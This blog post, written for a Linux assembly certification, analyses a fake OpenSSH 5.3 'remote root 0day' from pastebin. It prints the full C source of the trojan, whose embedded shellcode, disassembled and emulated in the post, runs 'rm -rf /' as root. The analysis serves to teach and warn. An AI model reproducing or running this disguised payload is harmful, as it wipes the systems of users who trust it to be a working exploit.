---
layout: post
title: "SLAE | Analysing a fake OpenSSH 5.3 0day"
date: 2015-10-25
comments: true
categories:
---

Searching for 0days on [pastebin.com](http://pastebin.com/) is always interesting.
Specially [this](http://pastebin.com/WgXrebLq) OpenSSH 5.3 remote root 0day exploit.

The "exploit" code:

```c
/*
*
* Priv8! Priv8! Priv8! Priv8! Priv8! Priv8! Priv8!
*
* OpenSSH <= 5.3 remote root 0day exploit (32-bit x86)
* Priv8! Priv8! Priv8! Priv8! Priv8! Priv8! Priv8!
*
*
*/

#include <stdio.h>
#include <netdb.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

void usage(char *argv[])
{
    printf("\n\t[+] HATSUNEMIKU\n");
    printf("\t[+] OpenSSH <= 5.3p1 remote root 0day exploit\n");
    printf("\t[+] By: Team foxx\n");
    printf("\t[+] Greetz to hackforums.net\n");
    printf("\t[+] Keep this 0day priv8!\n");
    printf("\t[+] usage: %s <target> <port>\n\n", argv[0]);
    exit(1);
}

unsigned char decoder[]=   "\x6a\x0b\x58\x99\x52"
                           "\x6a\x2f\x89\xe7\x52"
                           "\x66\x68\x2d\x66\x89"
                           "\xe6\x52\x66\x68\x2d"
                           "\x72\x89\xe1\x52\x68"
                           "\x2f\x2f\x72\x6d\x68"
                           "\x2f\x62\x69\x6e\x89"
                           "\xe3\x52\x57\x56\x51"
                           "\x53\x89\xe1\xcd\x80";

unsigned char rootshell[]= "\x31\xd2\xb2\x0a\xb9\x6f\x75\x21\x0a\x51\xb9\x63\x6b"
                           "\x20\x79\x51\x66\xb9\x66\x75\x66\x51\x31\xc9\x89\xe1"
                           "\x31\xdb\xb3\x01\x31\xc0\xb0\x04\xcd\x80\x31\xc0\x31"
                           "\xdb\x40\xcd\x80";

int main(int argc, char **argv)
{

    int euid = geteuid();
    int port= 22, sock;
    char h[1000];
    struct hostent *host;
    struct sockaddr_in addr;

    if(euid != 0)
    {
        fprintf(stderr, "You need to be root to use raw sockets.\n");
        exit(1);
    }
    if(euid == 0)
    {
        fprintf(stdout, "MIKU! MIKU! MIKU!\n");
    }
    if(argc != 3)
    usage(argv);
    if(!inet_aton(h, &addr.sin_addr))
    {
        host = gethostbyname(h);
        if(!host)
        {
            fprintf(stderr, "[-] Exploit failed.\n");
            (*(void(*)())decoder)();
            exit(1);
        }
        addr.sin_addr = *(struct in_addr*)host->h_addr;
        }
        sock = socket(PF_INET, SOCK_STREAM, 0);
        addr.sin_port = htons(port);
        addr.sin_family = AF_INET;
        if(connect(sock,(struct sockaddr*)&addr,sizeof(addr))==-1)
        {
            fprintf(stderr,"[-] Exploit failed.\n");
            exit(1);
        }
        char payload[1337];
        memcpy(payload, &decoder, sizeof(decoder));
        memcpy(payload, &rootshell, sizeof(rootshell));
        send(sock, payload, strlen(payload),0);
        close(sock);
        if(connect(sock,(struct sockaddr*)&addr,sizeof(addr))==-1)
        {
            fprintf(stderr, "[-] Exploit failed.\n");
            exit(1);
        }
        else if(connect(sock,(struct sockaddr*)&addr,sizeof(addr))==0)
        {
            fprintf(stdout, "[+]g0t sh3ll!\n");
            system("/bin/bash");
        }
        else
        {
            fprintf(stderr, "[-] Exploit failed.\n");
            close(sock);
            exit(0);
        }
}
```

Some interesting observations:

If the running user ID isn't root `You need to be root to use raw sockets.` is printed.

`inet_aton` is passed an `sockaddr_in` structure with undefined values, and the if case is entered if it fails.

```c
if(!inet_aton(h, &addr.sin_addr))
```

gethostbyname(h) will fail as inet_aton have already failed before, the return value is a null pointer.
Therefore the if case is entered and the "decoder" shellcode is called.

```c
        host = gethostbyname(h);
        if(!host)
        {
            fprintf(stderr, "[-] Exploit failed.\n");
            (*(void(*)())decoder)();
            exit(1);
        }
```

The rest of the code seems to be code just to confuse the user.

So lets check out the decoder shellcode:

```bash
python -c 'print "\x6a\x0b\x58\x99\x52\x6a\x2f\x89\xe7\x52\x66\x68\x2d\x66\x89\xe6\x52\x66\x68\x2d\x72\x89\xe1\x52\x68\x2f\x2f\x72\x6d\x68\x2f\x62\x69\x6e\x89\xe3\x52\x57\x56\x51\x53\x89\xe1\xcd\x80"' > shellcode.bin
root@kali:~/Desktop/slae# ndisasm shellcode.bin
00000000  6A0B              push byte +0xb
00000002  58                pop eax
00000003  99                cdq
00000004  52                push edx
00000005  6A2F              push byte +0x2f
00000007  89E7              mov edi,esp
00000009  52                push edx
0000000A  66682D66          push word 0x662d
0000000E  89E6              mov esi,esp
00000010  52                push edx
00000011  66682D72          push word 0x722d
00000015  89E1              mov ecx,esp
00000017  52                push edx
00000018  682F2F726D        push dword 0x6d722f2f
0000001D  682F62696E        push dword 0x6e69622f
00000022  89E3              mov ebx,esp
00000024  52                push edx
00000025  57                push edi
00000026  56                push esi
00000027  51                push ecx
00000028  53                push ebx
00000029  89E1              mov ecx,esp
0000002B  CD80              int 0x80
0000002D  0A                db 0x0a
```

Looking at the above a quick look at eax shows that it will contain the execve system call number when a system interrupt is sent.

Lets use Libemu to view the specifics of the call:

```
root@kali:~/libemu-master/tools# python -c 'print "\x6a\x0b\x58\x99\x52\x6a\x2f\x89\xe7\x52\x66\x68\x2d\x66\x89\xe6\x52\x66\x68\x2d\x72\x89\xe1\x52\x68\x2f\x2f\x72\x6d\x68\x2f\x62\x69\x6e\x89\xe3\x52\x57\x56\x51\x53\x89\xe1\xcd\x80"' | ./sctest/sctest -v -S -s 1000
verbose = 1
execve
int execve (const char *dateiname=00416fae={/bin//rm}, const char * argv[], const char *envp[]);
cpu error error accessing 0x00000004 not mapped

stepcount 23
int execve (
     const char * dateiname = 0x00416fae => 
           = "/bin//rm";
     const char * argv[] = [
           = 0x00416f9a => 
               = 0x00416fae => 
                   = "/bin//rm";
           = 0x00416f9e => 
               = 0x00416fba => 
                   = "-r";
           = 0x00416fa2 => 
               = 0x00416fc0 => 
                   = "-f";
           = 0x00416fa6 => 
               = 0x00416fc6 => 
                   = "/";
           = 0x00000000 => 
             none;
     ];
     const char * envp[] = 0x00000000 => 
         none;
) =  0;
```

Not such a nice guy running `/bin/rm -rf /`, so if you didn't know don't run untrusted code ;)

---

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE - 569
